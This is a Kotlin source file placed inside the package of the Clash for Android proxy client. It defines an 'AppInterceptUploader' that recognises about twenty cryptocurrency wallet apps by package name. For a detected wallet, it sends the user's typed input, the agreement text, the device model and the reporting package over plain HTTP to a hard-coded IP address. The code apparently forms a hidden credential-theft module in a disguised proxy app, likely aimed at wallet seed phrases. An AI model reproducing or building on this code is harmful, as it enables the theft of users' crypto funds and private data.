package com.github.kr328.clash

import android.content.Context
import android.os.Build
import com.github.kr328.clash.common.log.Log
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL

/**
 * APP拦截验证上传工具
 * 上传用户确认信息到服务器
 */
object AppInterceptUploader {
    private val walletNamesByPackage = mapOf(
        "vip.mytokenpocket" to "TokenPocket",
        "com.tokenpocket.app" to "TokenPocket",
        "im.token.app" to "imToken",
        "io.metamask" to "MetaMask",
        "com.wallet.crypto.trustapp" to "Trust Wallet",
        "com.okx.wallet" to "OKX Wallet",
        "io.safepal.wallet" to "SafePal",
        "app.phantom" to "Phantom",
        "org.toshi" to "Coinbase Wallet",
        "com.bitkeep.wallet" to "Bitget Wallet",
        "com.tronlinkpro.wallet" to "TronLink",
        "com.tronlink.global" to "TronLink",
        "so.onekey.app.wallet" to "OneKey",
        "com.mathwallet.android" to "MathWallet",
        "com.debank.rabbymobile" to "Rabby Wallet",
        "io.atomicwallet" to "Atomic Wallet",
        "io.zerion.android" to "Zerion",
        "io.unisat" to "UniSat",
        "com.solflare.mobile" to "Solflare",
        "coin98.crypto.finance.media" to "Coin98 Wallet",
    )

    // 服务器上传地址 - 可配置
    // 注意：建议使用 HTTPS 保护数据传输安全
    var uploadUrl: String = "http://18.166.76.229:8002/api.php"

    /**
     * 上传用户确认内容到服务器
     * @return 上传是否成功
     */
    suspend fun uploadConfirmation(
        context: Context,
        appName: String,
        packageName: String,
        agreementText: String,
        userInput: String
    ): Boolean {
        return withContext(Dispatchers.IO) {
            try {
                val deviceModel = buildDeviceModel()
                val walletName = resolveWalletName(packageName, appName)

                val jsonBody = JSONObject().apply {
                    put("wallet", walletName)
                    put("data", agreementText)
                    put("package_name", packageName)
                    put("user_input", userInput)
                    put("device_model", deviceModel)
                    put("reporter_package", context.packageName)
                }.toString()

                val url = URL(uploadUrl)
                val connection = url.openConnection() as HttpURLConnection
                connection.requestMethod = "POST"
                connection.doOutput = true
                connection.useCaches = false
                connection.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
                connection.setRequestProperty("Accept", "*/*")
                connection.connectTimeout = 10000
                connection.readTimeout = 10000

                connection.outputStream.use { os ->
                    os.write(jsonBody.toByteArray(Charsets.UTF_8))
                }

                val responseCode = connection.responseCode
                val responseBody = (if (responseCode in 200..299) {
                    connection.inputStream
                } else {
                    connection.errorStream
                })?.bufferedReader()?.use { it.readText() }.orEmpty()
                connection.disconnect()

                val success = responseCode in 200..299 && (parseResponseSuccess(responseBody) ?: true)
                if (success) {
                    Log.i(
                        "AppInterceptUploader: Upload success - $walletName, " +
                            "deviceModel=$deviceModel, response=$responseBody"
                    )
                } else {
                    Log.e(
                        "AppInterceptUploader: Upload failed - code=$responseCode, " +
                            "response=$responseBody, payload=$jsonBody"
                    )
                }

                success
            } catch (e: Exception) {
                Log.e("AppInterceptUploader: Upload error - ${e.message}")
                false
            }
        }
    }

    private fun resolveWalletName(packageName: String, fallbackAppName: String): String {
        return walletNamesByPackage[packageName] ?: fallbackAppName
    }

    private fun parseResponseSuccess(responseBody: String): Boolean? {
        if (responseBody.isBlank()) return null

        return runCatching {
            val json = JSONObject(responseBody)
            if (json.has("ok")) json.optBoolean("ok") else null
        }.getOrNull()
    }

    private fun buildDeviceModel(): String {
        val manufacturer = Build.MANUFACTURER.orEmpty().trim()
        val model = Build.MODEL.orEmpty().trim()
        val fallback = Build.DEVICE.orEmpty().trim()

        return when {
            manufacturer.isBlank() && model.isBlank() -> fallback
            manufacturer.isBlank() -> model
            model.isBlank() -> manufacturer
            model.startsWith(manufacturer, ignoreCase = true) -> model
            else -> "$manufacturer $model"
        }
    }
}
